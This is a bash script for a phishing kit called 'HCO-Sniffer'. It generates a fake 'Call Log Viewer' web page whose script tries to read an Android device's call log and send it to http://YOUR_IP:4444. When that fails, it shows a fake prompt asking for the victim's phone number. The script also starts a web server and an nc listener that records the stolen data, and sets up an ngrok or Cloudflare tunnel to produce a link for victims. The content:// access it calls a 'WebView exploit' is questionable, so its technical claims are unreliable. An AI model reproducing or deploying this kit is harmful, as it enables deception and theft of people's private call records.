#!/bin/bash

# Output directory
OUTPUT_DIR="/sdcard/HcoSnifferWeb"
mkdir -p "$OUTPUT_DIR"

# Generate phishing page
cat > "$OUTPUT_DIR/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Call Log Viewer</title>
    <style>
        body { background: #000; color: #00FF00; font-family: monospace; padding: 20px; }
        input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>HCO-Sniffer</h1>
    <p>Loading call logs... Please wait.</p>
    <script>
        // WebView exploit: Trigger intent to access call logs
        fetch('content://call_log/calls')
            .then(res => res.text())
            .then(data => {
                document.body.innerHTML = "<pre>" + data + "</pre>";
                // Exfiltrate logs
                fetch('http://YOUR_IP:4444?logs=' + encodeURIComponent(data));
            })
            .catch(() => {
                // Fallback: Fake input prompt
                document.body.innerHTML = "<p>Enter your phone number to decrypt logs:</p><input id='num'><button onclick='alert(\"Decryption failed. Submit to support@hcosniffer.com\")'>Decrypt</button>";
            });
    </script>
</body>
</html>
EOF

# Start HTTP server
echo "Starting server on port 8080..."
cd "$OUTPUT_DIR" && python3 -m http.server 8080 &

# Start listener for exfiltrated logs
nc -lvnp 4444 > "$OUTPUT_DIR/logs.txt" &

# Generate tunnel link
echo -e "\n\e[31m⚠️ Choose tunnel method:\e[0m"
echo "1) Ngrok"
echo "2) Cloudflare"
read -p "Option: " TUNNEL

if [ "$TUNNEL" = "1" ]; then
    ngrok http 8080 > "$OUTPUT_DIR/ngrok.log" &
    sleep 5
    LINK=$(grep -o 'https://[^ ]*.ngrok.io' "$OUTPUT_DIR/ngrok.log" | head -1)
else
    echo "Run: cloudflared tunnel --url http://localhost:8080"
    read -p "Enter Cloudflare URL: " LINK
fi

echo -e "\n\e[32mVisit this link on Android:\e[0m $LINK"
echo -e "\n\e[33mReal-time logs will appear below:\e[0m"
tail -f "$OUTPUT_DIR/logs.txt"
